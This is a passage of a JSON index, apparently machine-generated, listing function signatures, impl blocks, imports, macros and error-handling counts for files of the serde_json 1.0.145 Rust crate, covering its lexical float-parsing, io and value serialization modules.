          "debug_assert!(n <= bits, \"lower_n_mask() overflow in shl.\");",
          "debug_assert!(n <= bits, \"lower_n_halfway() overflow in shl.\");",
          "debug_assert!(bit <= bits, \"internal_n_halfway() overflow in shl.\");",
          "debug_assert!(n <= bits, \"internal_n_halfway() overflow in shl.\");",
          "debug_assert!(bit >= n, \"internal_n_halfway() overflow in sub.\");"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lexical/cached.rs",
        "function_defs": [
          "fn get_powers() -> &'static ModeratePathPowers;",
          "fn get_powers() -> &'static ModeratePathPowers {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl ExtendedFloatArray {",
          "impl ModeratePathPowers {",
          "impl ModeratePathCache for ExtendedFloat {"
        ],
        "uses": [
          "use super::cached_float80;",
          "use super::float::ExtendedFloat;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lexical/num.rs",
        "function_defs": [
          "fn as_u32(self) -> u32;",
          "fn as_u64(self) -> u64;",
          "fn as_u128(self) -> u128;",
          "fn as_usize(self) -> usize;",
          "fn as_f32(self) -> f32;",
          "fn as_f64(self) -> f64;",
          "fn as_u32(self) -> u32 {",
          "fn as_u64(self) -> u64 {",
          "fn as_u128(self) -> u128 {",
          "fn as_usize(self) -> usize {",
          "fn as_f32(self) -> f32 {",
          "fn as_f64(self) -> f64 {",
          "fn as_cast<N: AsPrimitive>(n: N) -> Self;",
          "fn as_cast<N: AsPrimitive>(n: N) -> Self {",
          "fn exponent_limit() -> (i32, i32);",
          "fn mantissa_limit() -> i32;",
          "fn pow10(self, n: i32) -> Self;",
          "fn from_bits(u: Self::Unsigned) -> Self;",
          "fn to_bits(self) -> Self::Unsigned;",
          "fn is_sign_positive(self) -> bool;",
          "fn is_denormal(self) -> bool {",
          "fn is_special(self) -> bool {",
          "fn is_inf(self) -> bool {",
          "fn exponent(self) -> i32 {",
          "fn mantissa(self) -> Self::Unsigned {",
          "fn next_positive(self) -> Self {",
          "fn round_positive_even(self) -> Self {",
          "fn exponent_limit() -> (i32, i32) {",
          "fn mantissa_limit() -> i32 {",
          "fn pow10(self, n: i32) -> f32 {",
          "fn from_bits(u: u32) -> f32 {",
          "fn to_bits(self) -> u32 {",
          "fn is_sign_positive(self) -> bool {",
          "fn exponent_limit() -> (i32, i32) {",
          "fn mantissa_limit() -> i32 {",
          "fn pow10(self, n: i32) -> f64 {",
          "fn from_bits(u: u64) -> f64 {",
          "fn to_bits(self) -> u64 {",
          "fn is_sign_positive(self) -> bool {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl AsPrimitive for $ty {",
          "impl AsCast for $ty {",
          "impl Number for $ty {}",
          "impl Integer for $ty {",
          "impl Mantissa for u64 {",
          "impl Float for f32 {",
          "impl Float for f64 {"
        ],
        "uses": [
          "use core::ops;"
        ],
        "macros": [
          "as_cast_impl!(u32, as_u32);",
          "as_cast_impl!(u64, as_u64);",
          "as_cast_impl!(u128, as_u128);",
          "as_cast_impl!(usize, as_usize);",
          "as_cast_impl!(f32, as_f32);",
          "as_cast_impl!(f64, as_f64);",
          "debug_assert!(self.is_sign_positive() && !self.is_inf());",
          "debug_assert!({",
          "debug_assert!({"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lexical/float.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [
          "impl ExtendedFloat {"
        ],
        "uses": [
          "use super::num::*;",
          "use super::rounding::*;",
          "use super::shift::*;"
        ],
        "macros": [
          "debug_assert!((self.mant & u64::HIMASK != 0) && (b.mant & u64::HIMASK != 0));"
        ],
        "derives": [
          "#[derive(Clone, Copy, Debug, PartialEq, Eq)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lexical/digit.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lexical/cached_float80.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::cached::{ExtendedFloatArray, ModeratePathPowers};"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lexical/large_powers32.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lexical/algorithm.rs",
        "function_defs": [
          "fn multiply_exponent_extended<F>(fp: &mut ExtendedFloat, exponent: i32, truncated: bool) -> bool"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::bhcomp::*;",
          "use super::cached::*;",
          "use super::errors::*;",
          "use super::float::ExtendedFloat;",
          "use super::num::*;",
          "use super::small_powers::*;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lexical/mod.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lexical/parse.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::algorithm::*;",
          "use super::bhcomp::*;",
          "use super::digit::*;",
          "use super::exponent::*;",
          "use super::num::*;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lexical/large_powers64.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lexical/bignum.rs",
        "function_defs": [
          "fn default() -> Self {",
          "fn data(&self) -> &Vec<Limb> {",
          "fn data_mut(&mut self) -> &mut Vec<Limb> {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Default for Bigint {",
          "impl Math for Bigint {"
        ],
        "uses": [
          "use super::math::*;",
          "use alloc::vec::Vec;"
        ],
        "macros": [],
        "derives": [
          "#[derive(Clone, PartialEq, Eq)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lexical/errors.rs",
        "function_defs": [
          "fn error_scale() -> u32;",
          "fn error_halfscale() -> u32;",
          "fn error_is_accurate<F: Float>(count: u32, fp: &ExtendedFloat) -> bool;",
          "fn nearest_error_is_accurate(errors: u64, fp: &ExtendedFloat, extrabits: u64) -> bool {",
          "fn error_scale() -> u32 {",
          "fn error_halfscale() -> u32 {",
          "fn error_is_accurate<F: Float>(count: u32, fp: &ExtendedFloat) -> bool {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl FloatErrors for u64 {"
        ],
        "uses": [
          "use super::float::*;",
          "use super::num::*;",
          "use super::rounding::*;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lexical/math.rs",
        "function_defs": [
          "fn as_wide<T: Integer>(t: T) -> Wide {",
          "fn split_u64(x: u64) -> [Limb; 2] {",
          "fn split_u64(x: u64) -> [Limb; 1] {",
          "fn u64_to_hi64_1(r0: u64) -> (u64, bool) {",
          "fn u64_to_hi64_2(r0: u64, r1: u64) -> (u64, bool) {",
          "fn hi64_1(&self) -> (u64, bool);",
          "fn hi64_2(&self) -> (u64, bool);",
          "fn hi64_3(&self) -> (u64, bool);",
          "fn hi64(&self) -> (u64, bool) {",
          "fn hi64_1(&self) -> (u64, bool) {",
          "fn hi64_2(&self) -> (u64, bool) {",
          "fn hi64_3(&self) -> (u64, bool) {",
          "fn hi64_1(&self) -> (u64, bool) {",
          "fn hi64_2(&self) -> (u64, bool) {",
          "fn hi64_3(&self) -> (u64, bool) {",
          "fn long_mul(x: &[Limb], y: &[Limb]) -> Vec<Limb> {",
          "fn karatsuba_mul(x: &[Limb], y: &[Limb]) -> Vec<Limb> {",
          "fn karatsuba_uneven_mul(x: &[Limb], mut y: &[Limb]) -> Vec<Limb> {",
          "fn karatsuba_mul_fwd(x: &[Limb], y: &[Limb]) -> Vec<Limb> {",
          "fn data(&self) -> &Vec<Limb>;",
          "fn data_mut(&mut self) -> &mut Vec<Limb>;",
          "fn compare(&self, y: &Self) -> cmp::Ordering {",
          "fn hi64(&self) -> (u64, bool) {",
          "fn bit_length(&self) -> usize {",
          "fn from_u64(x: u64) -> Self {",
          "fn normalize(&mut self) {",
          "fn iadd_small(&mut self, y: Limb) {",
          "fn imul_small(&mut self, y: Limb) {",
          "fn imul_pow2(&mut self, n: u32) {",
          "fn imul_pow5(&mut self, n: u32) {",
          "fn imul_pow10(&mut self, n: u32) {",
          "fn ishl(&mut self, n: usize) {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Hi64<u32> for [u32] {",
          "impl Hi64<u64> for [u64] {"
        ],
        "uses": [
          "use super::large_powers;",
          "use super::num::*;",
          "use super::small_powers::*;",
          "use alloc::vec::Vec;",
          "use core::{cmp, iter, mem};",
          "use super::*;",
          "use super::*;",
          "use super::large::KARATSUBA_CUTOFF;",
          "use super::*;"
        ],
        "macros": [
          "debug_assert!(r0 != 0);",
          "debug_assert!(r0 != 0);",
          "debug_assert!(self.len() == 1);",
          "debug_assert!(self.len() == 2);",
          "debug_assert!(self.len() >= 3);",
          "debug_assert!(self.len() == 1);",
          "debug_assert!(self.len() >= 2);",
          "debug_assert!(x.len() > xstart && (x[xstart] >= y || x.len() > xstart + 1));",
          "debug_assert!(bit_length != 0 && bit_length <= large_powers.len());",
          "debug_assert!(idx < large_powers.len());",
          "debug_assert!(n < bits);",
          "debug_assert!(n != 0);",
          "debug_assert!(greater_equal(x, y));"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lexical/small_powers.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lexical/exponent.rs",
        "function_defs": [
          "fn into_i32(value: usize) -> i32 {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lexical/large_powers.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lexical/shift.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::float::ExtendedFloat;",
          "use core::mem;"
        ],
        "macros": [
          "debug_assert!((shift as u64) < bits, \"shr() overflow in shift right.\");",
          "debug_assert!(",
          "debug_assert!((shift as u64) < bits, \"shl() overflow in shift left.\");"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/lexical/bhcomp.rs",
        "function_defs": [
          "fn parse_mantissa<F>(integer: &[u8], fraction: &[u8]) -> Bigint",
          "fn round_nearest_tie_even(fp: &mut ExtendedFloat, shift: i32, is_truncated: bool) {",
          "fn large_atof<F>(mantissa: Bigint, exponent: i32) -> F",
          "fn small_atof<F>(mantissa: Bigint, exponent: i32, f: F) -> F"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use super::bignum::*;",
          "use super::digit::*;",
          "use super::exponent::*;",
          "use super::float::*;",
          "use super::math::*;",
          "use super::num::*;",
          "use super::rounding::*;",
          "use core::{cmp, mem};"
        ],
        "macros": [
          "debug_assert!(real_exp < 0);"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/io/core.rs",
        "function_defs": [
          "fn fmt(&self, _formatter: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn write(&mut self, buf: &[u8]) -> Result<usize>;",
          "fn write_all(&mut self, buf: &[u8]) -> Result<()> {",
          "fn flush(&mut self) -> Result<()>;",
          "fn write(&mut self, buf: &[u8]) -> Result<usize> {",
          "fn write_all(&mut self, buf: &[u8]) -> Result<()> {",
          "fn flush(&mut self) -> Result<()> {",
          "fn write(&mut self, buf: &[u8]) -> Result<usize> {",
          "fn write_all(&mut self, buf: &[u8]) -> Result<()> {",
          "fn flush(&mut self) -> Result<()> {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Display for Error {",
          "impl Error {",
          "impl Write for Vec<u8> {"
        ],
        "uses": [
          "use alloc::vec::Vec;",
          "use core::fmt::{self, Display};",
          "use core::result;"
        ],
        "macros": [
          "unreachable!()",
          "debug_assert!(result.is_ok());",
          "debug_assert_eq!(result.unwrap_or(0), buf.len());"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/io/mod.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::io as imp;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/value/index.rs",
        "function_defs": [
          "fn index_into<'v>(&self, v: &'v Value) -> Option<&'v Value>;",
          "fn index_into_mut<'v>(&self, v: &'v mut Value) -> Option<&'v mut Value>;",
          "fn index_or_insert<'v>(&self, v: &'v mut Value) -> &'v mut Value;",
          "fn index_into<'v>(&self, v: &'v Value) -> Option<&'v Value> {",
          "fn index_into_mut<'v>(&self, v: &'v mut Value) -> Option<&'v mut Value> {",
          "fn index_or_insert<'v>(&self, v: &'v mut Value) -> &'v mut Value {",
          "fn index_into<'v>(&self, v: &'v Value) -> Option<&'v Value> {",
          "fn index_into_mut<'v>(&self, v: &'v mut Value) -> Option<&'v mut Value> {",
          "fn index_or_insert<'v>(&self, v: &'v mut Value) -> &'v mut Value {",
          "fn index_into<'v>(&self, v: &'v Value) -> Option<&'v Value> {",
          "fn index_into_mut<'v>(&self, v: &'v mut Value) -> Option<&'v mut Value> {",
          "fn index_or_insert<'v>(&self, v: &'v mut Value) -> &'v mut Value {",
          "fn index_into<'v>(&self, v: &'v Value) -> Option<&'v Value> {",
          "fn index_into_mut<'v>(&self, v: &'v mut Value) -> Option<&'v mut Value> {",
          "fn index_or_insert<'v>(&self, v: &'v mut Value) -> &'v mut Value {",
          "fn fmt(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn index(&self, index: I) -> &Value {",
          "fn index_mut(&mut self, index: I) -> &mut Value {"
        ],
        "struct_defs": [
          "struct Type<'a>(&'a Value);"
        ],
        "impl_blocks": [
          "impl Index for usize {",
          "impl Index for str {",
          "impl Index for String {",
          "impl Sealed for usize {}",
          "impl Sealed for str {}",
          "impl Sealed for alloc::string::String {}"
        ],
        "uses": [
          "use super::Value;",
          "use crate::map::Map;",
          "use alloc::borrow::ToOwned;",
          "use alloc::string::String;",
          "use core::fmt::{self, Display};",
          "use core::ops;"
        ],
        "macros": [
          "/// let data = json!({ \"inner\": [1, 2, 3] });",
          "/// assert_eq!(first, 1);",
          "panic!(",
          "_ => panic!(\"cannot access index {} of JSON {}\", self, Type(v)),",
          "_ => panic!(\"cannot access key {:?} in JSON {}\", self, Type(v)),",
          "/// let data = json!({",
          "/// assert_eq!(data[\"x\"][\"y\"], json!([\"z\", \"zz\"]));",
          "/// assert_eq!(data[\"x\"][\"y\"][0], json!(\"z\"));",
          "/// assert_eq!(data[\"a\"], json!(null)); // returns null for undefined values",
          "/// assert_eq!(data[\"a\"][\"b\"], json!(null)); // does not panic",
          "/// let mut data = json!({ \"x\": 0 });",
          "/// data[\"x\"] = json!(1);",
          "/// data[\"y\"] = json!([false, false, false]);",
          "/// data[\"y\"][0] = json!(true);",
          "/// data[\"a\"][\"b\"][\"c\"][\"d\"] = json!(true);",
          "/// println!(\"{}\", data);"
        ],
        "derives": [],
        "error_handling": 11
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/value/ser.rs",
        "function_defs": [
          "fn serialize<S>(&self, serializer: S) -> result::Result<S::Ok, S::Error>",
          "fn serialize_bool(self, value: bool) -> Result<Value> {",
          "fn serialize_i8(self, value: i8) -> Result<Value> {",
          "fn serialize_i16(self, value: i16) -> Result<Value> {",
          "fn serialize_i32(self, value: i32) -> Result<Value> {",
          "fn serialize_i64(self, value: i64) -> Result<Value> {",
          "fn serialize_i128(self, value: i128) -> Result<Value> {",
          "fn serialize_u8(self, value: u8) -> Result<Value> {",
          "fn serialize_u16(self, value: u16) -> Result<Value> {",
          "fn serialize_u32(self, value: u32) -> Result<Value> {",
          "fn serialize_u64(self, value: u64) -> Result<Value> {",
          "fn serialize_u128(self, value: u128) -> Result<Value> {",
          "fn serialize_f32(self, float: f32) -> Result<Value> {",
          "fn serialize_f64(self, float: f64) -> Result<Value> {",
          "fn serialize_char(self, value: char) -> Result<Value> {",
          "fn serialize_str(self, value: &str) -> Result<Value> {",
          "fn serialize_bytes(self, value: &[u8]) -> Result<Value> {",
          "fn serialize_unit(self) -> Result<Value> {",
          "fn serialize_unit_struct(self, _name: &'static str) -> Result<Value> {",
          "fn serialize_unit_variant(",
          "fn serialize_newtype_struct<T>(self, _name: &'static str, value: &T) -> Result<Value>",
          "fn serialize_newtype_variant<T>(",
          "fn serialize_none(self) -> Result<Value> {",
          "fn serialize_some<T>(self, value: &T) -> Result<Value>",
          "fn serialize_seq(self, len: Option<usize>) -> Result<Self::SerializeSeq> {",
          "fn serialize_tuple(self, len: usize) -> Result<Self::SerializeTuple> {",
          "fn serialize_tuple_struct(",
          "fn serialize_tuple_variant(",
          "fn serialize_map(self, len: Option<usize>) -> Result<Self::SerializeMap> {",
          "fn serialize_struct(self, name: &'static str, len: usize) -> Result<Self::SerializeStruct> {",
          "fn serialize_struct_variant(",
          "fn collect_str<T>(self, value: &T) -> Result<Value>",
          "fn serialize_element<T>(&mut self, value: &T) -> Result<()>",
          "fn end(self) -> Result<Value> {",
          "fn serialize_element<T>(&mut self, value: &T) -> Result<()>",
          "fn end(self) -> Result<Value> {",
          "fn serialize_field<T>(&mut self, value: &T) -> Result<()>",
          "fn end(self) -> Result<Value> {",
          "fn serialize_field<T>(&mut self, value: &T) -> Result<()>",
          "fn end(self) -> Result<Value> {",
          "fn serialize_key<T>(&mut self, key: &T) -> Result<()>",
          "fn serialize_value<T>(&mut self, value: &T) -> Result<()>",
          "fn end(self) -> Result<Value> {",
          "fn key_must_be_a_string() -> Error {",
          "fn float_key_must_be_finite() -> Error {",
          "fn serialize_unit_variant(",
          "fn serialize_newtype_struct<T>(self, _name: &'static str, value: &T) -> Result<String>",
          "fn serialize_bool(self, value: bool) -> Result<String> {",
          "fn serialize_i8(self, value: i8) -> Result<String> {",
          "fn serialize_i16(self, value: i16) -> Result<String> {",
          "fn serialize_i32(self, value: i32) -> Result<String> {",
          "fn serialize_i64(self, value: i64) -> Result<String> {",
          "fn serialize_i128(self, value: i128) -> Result<String> {",
          "fn serialize_u8(self, value: u8) -> Result<String> {",
          "fn serialize_u16(self, value: u16) -> Result<String> {",
          "fn serialize_u32(self, value: u32) -> Result<String> {",
          "fn serialize_u64(self, value: u64) -> Result<String> {",
          "fn serialize_u128(self, value: u128) -> Result<String> {",
          "fn serialize_f32(self, value: f32) -> Result<String> {",
          "fn serialize_f64(self, value: f64) -> Result<String> {",
          "fn serialize_char(self, value: char) -> Result<String> {",
          "fn serialize_str(self, value: &str) -> Result<String> {",
          "fn serialize_bytes(self, _value: &[u8]) -> Result<String> {",
          "fn serialize_unit(self) -> Result<String> {",
          "fn serialize_unit_struct(self, _name: &'static str) -> Result<String> {",
          "fn serialize_newtype_variant<T>(",
          "fn serialize_none(self) -> Result<String> {",
          "fn serialize_some<T>(self, _value: &T) -> Result<String>",
          "fn serialize_seq(self, _len: Option<usize>) -> Result<Self::SerializeSeq> {",
          "fn serialize_tuple(self, _len: usize) -> Result<Self::SerializeTuple> {",
          "fn serialize_tuple_struct(",
          "fn serialize_tuple_variant(",
          "fn serialize_map(self, _len: Option<usize>) -> Result<Self::SerializeMap> {",
          "fn serialize_struct(self, _name: &'static str, _len: usize) -> Result<Self::SerializeStruct> {",
          "fn serialize_struct_variant(",
          "fn collect_str<T>(self, value: &T) -> Result<String>",
          "fn serialize_field<T>(&mut self, key: &'static str, value: &T) -> Result<()>",
          "fn end(self) -> Result<Value> {",
          "fn serialize_field<T>(&mut self, key: &'static str, value: &T) -> Result<()>",
          "fn end(self) -> Result<Value> {",
          "fn invalid_number() -> Error {",
          "fn serialize_bool(self, _v: bool) -> Result<Value> {",
          "fn serialize_i8(self, _v: i8) -> Result<Value> {",
          "fn serialize_i16(self, _v: i16) -> Result<Value> {",
          "fn serialize_i32(self, _v: i32) -> Result<Value> {",
          "fn serialize_i64(self, _v: i64) -> Result<Value> {",
          "fn serialize_u8(self, _v: u8) -> Result<Value> {",
          "fn serialize_u16(self, _v: u16) -> Result<Value> {",
          "fn serialize_u32(self, _v: u32) -> Result<Value> {",
          "fn serialize_u64(self, _v: u64) -> Result<Value> {",
          "fn serialize_f32(self, _v: f32) -> Result<Value> {",
          "fn serialize_f64(self, _v: f64) -> Result<Value> {",
          "fn serialize_char(self, _v: char) -> Result<Value> {",
          "fn serialize_str(self, value: &str) -> Result<Value> {",
          "fn serialize_bytes(self, _value: &[u8]) -> Result<Value> {",
          "fn serialize_none(self) -> Result<Value> {",
          "fn serialize_some<T>(self, _value: &T) -> Result<Value>",
          "fn serialize_unit(self) -> Result<Value> {",
          "fn serialize_unit_struct(self, _name: &'static str) -> Result<Value> {",
          "fn serialize_unit_variant(",
          "fn serialize_newtype_struct<T>(self, _name: &'static str, _value: &T) -> Result<Value>",
          "fn serialize_newtype_variant<T>(",
          "fn serialize_seq(self, _len: Option<usize>) -> Result<Self::SerializeSeq> {",
          "fn serialize_tuple(self, _len: usize) -> Result<Self::SerializeTuple> {",
          "fn serialize_tuple_struct(",
          "fn serialize_tuple_variant(",
          "fn serialize_map(self, _len: Option<usize>) -> Result<Self::SerializeMap> {",
          "fn serialize_struct(self, _name: &'static str, _len: usize) -> Result<Self::SerializeStruct> {",
          "fn serialize_struct_variant(",
          "fn invalid_raw_value() -> Error {",
          "fn serialize_bool(self, _v: bool) -> Result<Value> {",
          "fn serialize_i8(self, _v: i8) -> Result<Value> {",
          "fn serialize_i16(self, _v: i16) -> Result<Value> {",
          "fn serialize_i32(self, _v: i32) -> Result<Value> {",
          "fn serialize_i64(self, _v: i64) -> Result<Value> {",
          "fn serialize_u8(self, _v: u8) -> Result<Value> {",
          "fn serialize_u16(self, _v: u16) -> Result<Value> {",
          "fn serialize_u32(self, _v: u32) -> Result<Value> {",
          "fn serialize_u64(self, _v: u64) -> Result<Value> {",
          "fn serialize_f32(self, _v: f32) -> Result<Value> {",
          "fn serialize_f64(self, _v: f64) -> Result<Value> {",
          "fn serialize_char(self, _v: char) -> Result<Value> {",
          "fn serialize_str(self, value: &str) -> Result<Value> {",
          "fn serialize_bytes(self, _value: &[u8]) -> Result<Value> {",
          "fn serialize_none(self) -> Result<Value> {",
          "fn serialize_some<T>(self, _value: &T) -> Result<Value>",
          "fn serialize_unit(self) -> Result<Value> {",
          "fn serialize_unit_struct(self, _name: &'static str) -> Result<Value> {",
          "fn serialize_unit_variant(",
          "fn serialize_newtype_struct<T>(self, _name: &'static str, _value: &T) -> Result<Value>",
          "fn serialize_newtype_variant<T>(",
          "fn serialize_seq(self, _len: Option<usize>) -> Result<Self::SerializeSeq> {",
          "fn serialize_tuple(self, _len: usize) -> Result<Self::SerializeTuple> {",
          "fn serialize_tuple_struct(",
          "fn serialize_tuple_variant(",
          "fn serialize_map(self, _len: Option<usize>) -> Result<Self::SerializeMap> {",
          "fn serialize_struct(self, _name: &'static str, _len: usize) -> Result<Self::SerializeStruct> {",
          "fn serialize_struct_variant(",
          "fn collect_str<T>(self, value: &T) -> Result<Self::Ok>"
        ],
        "struct_defs": [
          "struct MapKeySerializer;",
          "struct NumberValueEmitter;",
          "struct RawValueEmitter;"
        ],
        "impl_blocks": [
          "impl Serialize for Value {",
          "impl serde::Serializer for Serializer {",
          "impl serde::ser::SerializeSeq for SerializeVec {",
          "impl serde::ser::SerializeTuple for SerializeVec {",
          "impl serde::ser::SerializeTupleStruct for SerializeVec {",
          "impl serde::ser::SerializeTupleVariant for SerializeTupleVariant {",
          "impl serde::ser::SerializeMap for SerializeMap {",
          "impl serde::Serializer for MapKeySerializer {",
          "impl serde::ser::SerializeStruct for SerializeMap {",
          "impl serde::ser::SerializeStructVariant for SerializeStructVariant {",
          "impl serde::ser::Serializer for NumberValueEmitter {",
          "impl serde::ser::Serializer for RawValueEmitter {"
        ],
        "uses": [
          "use crate::error::{Error, ErrorCode, Result};",
          "use crate::map::Map;",
          "use crate::value::{to_value, Value};",
          "use alloc::borrow::ToOwned;",
          "use alloc::string::{String, ToString};",
          "use alloc::vec::Vec;",
          "use core::fmt::Display;",
          "use core::result;",
          "use serde::ser::{Impossible, Serialize};",
          "use serde::ser::SerializeMap;"
        ],
        "macros": [
          "let mut map = tri!(serializer.serialize_map(Some(m.len())));",
          "tri!(map.serialize_entry(k, v));",
          "Value::Object(_) => unreachable!(),",
          "values.insert(String::from(variant), tri!(to_value(value)));",
          "self.vec.push(tri!(to_value(value)));",
          "self.vec.push(tri!(to_value(value)));",
          "*next_key = Some(tri!(key.serialize(MapKeySerializer)));",
          "SerializeMap::Number { .. } => unreachable!(),",
          "SerializeMap::RawValue { .. } => unreachable!(),",
          "map.insert(key, tri!(to_value(value)));",
          "SerializeMap::Number { .. } => unreachable!(),",
          "SerializeMap::RawValue { .. } => unreachable!(),",
          "SerializeMap::Number { .. } => unreachable!(),",
          "SerializeMap::RawValue { .. } => unreachable!(),",
          "*out_value = Some(tri!(value.serialize(NumberValueEmitter)));",
          "*out_value = Some(tri!(value.serialize(RawValueEmitter)));",
          "self.map.insert(String::from(key), tri!(to_value(value)));",
          "let n = tri!(value.to_owned().parse());"
        ],
        "derives": [],
        "error_handling": 30
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.145/src/value/de.rs",
        "function_defs": [
          "fn deserialize<D>(deserializer: D) -> Result<Value, D::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_bool<E>(self, value: bool) -> Result<Value, E> {",
          "fn visit_i64<E>(self, value: i64) -> Result<Value, E> {",
          "fn visit_i128<E>(self, value: i128) -> Result<Value, E>",
          "fn visit_u64<E>(self, value: u64) -> Result<Value, E> {",
          "fn visit_u128<E>(self, value: u128) -> Result<Value, E>",
          "fn visit_f64<E>(self, value: f64) -> Result<Value, E> {",
          "fn visit_str<E>(self, value: &str) -> Result<Value, E>",
          "fn visit_string<E>(self, value: String) -> Result<Value, E> {",
          "fn visit_none<E>(self) -> Result<Value, E> {",
          "fn visit_some<D>(self, deserializer: D) -> Result<Value, D::Error>",
          "fn visit_unit<E>(self) -> Result<Value, E> {",
          "fn visit_seq<V>(self, mut visitor: V) -> Result<Value, V::Error>",
          "fn visit_map<V>(self, mut visitor: V) -> Result<Value, V::Error>",
          "fn from_str(s: &str) -> Result<Value, Error> {",
          "fn from_str(s: &str) -> Result<Self, Error> {",
          "fn $method<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn $method<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn visit_array<'de, V>(array: Vec<Value>, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_any<V>(self, visitor: V) -> Result<V::Value, Self::Error>",
          "fn deserialize_enum<V>(",
          "fn deserialize_ignored_any<V>(self, visitor: V) -> Result<V::Value, Self::Error>",
